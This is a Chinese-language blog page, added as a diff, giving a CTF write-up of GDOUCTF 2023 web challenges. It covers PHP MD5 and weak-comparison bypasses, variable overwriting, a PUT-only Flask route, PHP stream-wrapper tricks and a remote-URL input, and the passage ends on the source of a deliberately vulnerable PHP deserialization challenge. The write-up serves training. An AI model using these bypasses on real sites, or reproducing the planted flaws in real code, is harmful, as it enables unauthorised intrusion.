@@ -1,0 +1,599 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>GDOUCTF 2023 复现 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hate-eat-snake"><span class="toc-number">2.1.</span> <span class="toc-text">hate eat snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">受不了一点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-WEB"><span class="toc-number">2.3.</span> <span class="toc-text">EZ WEB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="toc-number">2.4.</span> <span class="toc-text">泄露的伪装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E8%A7%A3"><span class="toc-number">2.4.1.</span> <span class="toc-text">常规解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A7%A3"><span class="toc-number">2.4.2.</span> <span class="toc-text">其他解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="toc-number">2.5.</span> <span class="toc-text">反方向的钟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lt-ez-ze-gt"><span class="toc-number">2.6.</span> <span class="toc-text">&lt;ez_ze&gt;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">2.6.1.</span> <span class="toc-text">一把梭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">2.6.2.</span> <span class="toc-text">预期解</span></a></li></ol></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>GDOUCTF 2023 复现</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/22
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF线上赛
+            </a>
+        </span>
+        
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.5k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">6分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0MzQyMTg4Ng==&mid=2247485169&idx=1&sn=740a94c0fb29b2f2f53baabc005185d1&chksm=c3356620f442ef36b38616fd7dfe75927bec426c00db9e19dd3eed92dbfc29d28f63381edc3f&mpshare=1&scene=23&srcid=0420AtF9P7k0t9Ic7d2P3uTG&sharer_sharetime=1681951092041&sharer_shareid=fc7b70c13aaf04f2deec392d19051097#rd">官方wp</a></p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422003601238.png" alt="image-20230422003601238"></p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422003631326.png" alt="image-20230422003631326"></p>
+<p>因为忙着打校赛以及期中考的原因导致这场比赛就摸了个签到就润了（</p>
+<p>yysy海报真好看，很戳xp（杀软二刺螈.jpg</p>
+<span id="more"></span>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><blockquote>
+<p>js代码混淆</p>
+</blockquote>
+<p>题目是一个贪吃蛇游戏，右键检查查看js文件</p>
+<p>发现使用了js代码混淆，难以直接找到flag</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422222808648.png" alt="image-20230422222808648"></p>
+<p>于是查找if语句，发现判断胜利的语句是<code>getScore&gt;60</code></p>
+<p>搜索发现<code>getScore</code>在<code>Snake.prototype</code>中</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422223311444.png" alt="image-20230422223311444"></p>
+<p>于是在控制台中执行并启动游戏得到flag</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422223517422.png" alt="image-20230422223517422"></p>
+<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><blockquote>
+<p>php特性</p>
+</blockquote>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230423203240611.png" alt="image-20230423203240611"></p>
+<ol>
+<li><p>MD5强比较</p>
+<p>直接用<a href="https://c1oudfl0w0.github.io/blog/2023/03/15/PHP%E7%89%B9%E6%80%A7/#md5%E7%AD%89%E6%95%88%E5%80%BC%E7%BB%95%E8%BF%87">数组绕过</a></p>
+</li>
+<li><p>传入cookie</p>
+</li>
+<li><p>php弱类型比较</p>
+<p>分别传入114514和114514a</p>
+</li>
+<li><p>变量覆盖</p>
+</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>   <span class="token comment">//（注意这里value只有一个$，把post进去的数组键名作为变量，数组中的键值作为变量的值</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>    <span class="token comment">//（注意这里value有2个$</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>eg:</p>
+<blockquote>
+<p>设置了一个变量$a&#x3D;a,然后post传入a&#x3D;b,那么就会把前面$a的值覆盖掉变成$a&#x3D;b，<code>foreach ($_GET as $key =&gt; $value) &#123;$$key = $$value; &#125; </code>&#x2F;&#x2F;（注意这里value有2个$同上，假如先设置了一个变量$a&#x3D;a,然后get传入a&#x3D;b,那么就会把前面$a的值覆盖掉变成$a&#x3D;$b</p>
+</blockquote>
+<p>因为$flag会被直接echo，所以要做的是不让$flag被覆盖</p>
+<p>POST传入<code>1=flag</code>则<code>$1=flag</code>（此时创建了一个新参数<code>1</code>）</p>
+<p>GET传入<code>1=flag</code>则<code>$1=flag</code>，然后传入<code>flag=1</code>则<code>$flag=$$1=$flag</code></p>
+<p>payload:</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230423203414129.png" alt="image-20230423203414129"></p>
+<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><blockquote>
+<p>src源码泄露</p>
+</blockquote>
+<blockquote>
+<p>PUT请求</p>
+</blockquote>
+<p>打开题目，f12查看网页源码发现提示&#x2F;src泄露</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422223856533.png" alt="image-20230422223856533"></p>
+<p>访问&#x2F;src得到python源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
+
+app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>很明显是要求我们用<code>PUT</code>请求访问其路由，于是启动burpsuite</p>
+<p>修改为PUT请求发送得到flag</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422224250826.png" alt="image-20230422224250826"></p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230422224423788.png" alt="image-20230422224423788"></p>
+<h2 id="泄露的伪装"><a href="#泄露的伪装" class="headerlink" title="泄露的伪装"></a>泄露的伪装</h2><blockquote>
+<p>源码泄露</p>
+</blockquote>
+<blockquote>
+<p>伪协议</p>
+</blockquote>
+<h3 id="常规解"><a href="#常规解" class="headerlink" title="常规解"></a>常规解</h3><p>打开题目，没有发现任何提示</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424211544845.png" alt="image-20230424211544845"></p>
+<p>于是这里选择直接dirsearch扫描</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424211705153.png" alt="image-20230424211705153"></p>
+<p>发现存在文件泄露</p>
+<p>访问&#x2F;test.txt发现php源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$cxk</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cxk'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$cxk</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">"ctrl"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"洗洗睡吧"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nononoononoonono"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问&#x2F;<a target="_blank" rel="noopener" href="http://www.rar得到压缩包/">www.rar得到压缩包</a></p>
+<p>解压后发现一个txt文件</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424212032318.png" alt="image-20230424212032318"></p>
+<p>访问&#x2F;orzorz.php，发现就是上面的php页面</p>
+<p>由于第二个if语句中要求读取的文件内要有ctrl才能返回flag，所以这里需要考虑使用<code>php://input</code>或<code>data://</code>协议传入带有’ctrl’的字符串</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424213118727.png" alt="image-20230424213118727"></p>
+<h3 id="其他解"><a href="#其他解" class="headerlink" title="其他解"></a>其他解</h3><p>在靶机出网的情况下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cxk<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//你的公网IP/1.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>1.txt里面的内容为ctrl</p>
+<h2 id="反方向的钟"><a href="#反方向的钟" class="headerlink" title="反方向的钟"></a>反方向的钟</h2><blockquote>
+<p>反序列化</p>
+</blockquote>
+<blockquote>
+<p>SplFileObject原生类</p>
+</blockquote>
+<p>打开题目看到php源码发现是反序列化</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// flag.php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$rank</span><span class="token punctuation">,</span><span class="token variable">$salary</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>	<span class="token comment">//此处会直接赋值$salary=10000</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">salary</span> <span class="token operator">=</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
